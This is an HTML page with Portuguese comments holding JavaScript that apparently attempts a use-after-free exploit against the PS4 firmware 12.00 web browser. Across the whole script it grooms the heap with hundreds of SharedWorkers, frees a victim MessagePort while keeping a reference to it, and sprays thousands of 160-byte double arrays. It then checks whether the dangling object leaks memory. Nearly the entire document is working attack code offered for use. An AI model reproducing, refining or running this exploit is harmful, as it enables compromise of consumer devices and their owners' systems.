<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 LEAK (0xA0)</title>
    
</head>
<body>

    <h1>PS4 12.00 - TARGET 0xA0</h1>
    <h3>Alvo: 160 bytes (SharedWorker)</h3>
    <div id="status">Pronto.</div>
    <div id="log"></div>
    
    <button onclick="start_exploit()">INICIAR</button>

    <script>
        function log(msg) {
            var d = document.getElementById("log");
            d.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // O TAMANHO MÁGICO
        var TARGET_SIZE = 0xA0; // 160 bytes

        // Payload: Array de Doubles (Butterfly Heap)
        function build_payload() {
            var elementCount = TARGET_SIZE / 8;
            var arr = new Array(elementCount);
            
            // Valor Marker: 1.1 (0x3FF199999999999A)
            // Se lido como ponteiro, é um endereço Userland seguro.
            // Se lido como vtable, causa crash controlado ou comportamento estranho.
            for(var i=0; i<arr.length; i++) {
                arr[i] = 1.1; 
            }
            return arr;
        }

        var workers = [];

        async function start_exploit() {
            if(!window.SharedWorker) return log("Erro: Navegador.");
            
            var payload = build_payload();
            log(`Payload 0xA0 construído.`);

            // 1. GROOMING (380)
            log("Grooming...");
            for(let i=0; i<380; i++) {
                try { workers.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
            }

            // 2. TRIGGER (403)
            log("Triggering...");
            var p_count = 0;
            var limit = 403 - 380;

            var it = setInterval(() => {
                if (p_count >= limit) {
                    clearInterval(it);
                    
                    // Vítima
                    var v = workers.pop();
                    var p = v.port; // Guarda ref
                    
                    // FREE
                    v.port.close();
                    v = null;
                    
                    // SPRAY
                    log("Spraying...");
                    var spray = [];
                    // Spray massivo para garantir que pegue o slot 0xA0
                    for(let k=0; k<20000; k++) {
                        spray.push(payload.slice(0));
                    }

                    // CHECK
                    setTimeout(() => {
                        check_leak(p);
                    }, 500);
                    
                    return;
                }
                
                try {
                    let w = new SharedWorker("data:text,1", "v"+p_count);
                    w.port.start();
                    workers.push(w);
                } catch(e){}
                p_count++;
            }, 50);
        }

        function check_leak(port) {
            try {
                var s = port.toString();
                
                // Se mudou, SUCESSO
                if (s.indexOf("MessagePort") === -1) {
                    log("!!! SUCESSO: 0xA0 É O TAMANHO !!!", "success");
                    document.body.style.backgroundColor = "green";
                    alert("LEAK ENCONTRADO! Tamanho 0xA0 confirmado.");
                } else {
                    log("Falha: Objeto ainda é MessagePort.");
                    
                    // Tenta forçar erro de ponteiro
                    try { let x = port.onmessage; } catch(e) {
                        if (e.toString().match(/0x[0-9a-fA-F]+/)) {
                            log("LEAK NO ERRO: " + e);
                            alert("LEAK ENCONTRADO NO ERRO!");
                        }
                    }
                }
            } catch(e) {
                log("Erro crítico na leitura: " + e);
            }
        }
    </script>
</body>
</html>
